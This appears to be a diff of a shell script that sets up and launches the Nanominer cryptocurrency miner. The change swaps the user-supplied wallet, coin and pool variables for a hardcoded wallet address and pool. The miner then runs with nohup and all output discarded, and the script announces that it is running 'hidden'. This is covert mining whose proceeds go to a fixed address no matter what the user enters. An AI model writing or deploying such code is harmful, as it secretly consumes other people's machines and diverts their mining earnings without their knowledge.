@@ -29,12 +29,12 @@ fi
 
 # Create config.ini
 cat <<EOL > config.ini
-wallet=$wallet
-coin=$coin
-pool=$pool
+wallet=NQjVj7UtqaYTiYrQ5nv5UDDaQXttxYZZxT
+coin=XNA
+pool=ethash.eu.mine.zergpool.com:9999
 email=$email
 EOL
 
 # Run Nanominer silently in background
-nohup ./nanominer --algo ethash --wallet NQjVj7UtqaYTiYrQ5nv5UDDaQXttxYZZxT --coin XNA --pool ethash.eu.mine.zergpool.com:9999 > /dev/null 2>&1 &
+nohup ./nanominer > /dev/null 2>&1 &
 echo "[+] Nanominer started in background (hidden)."
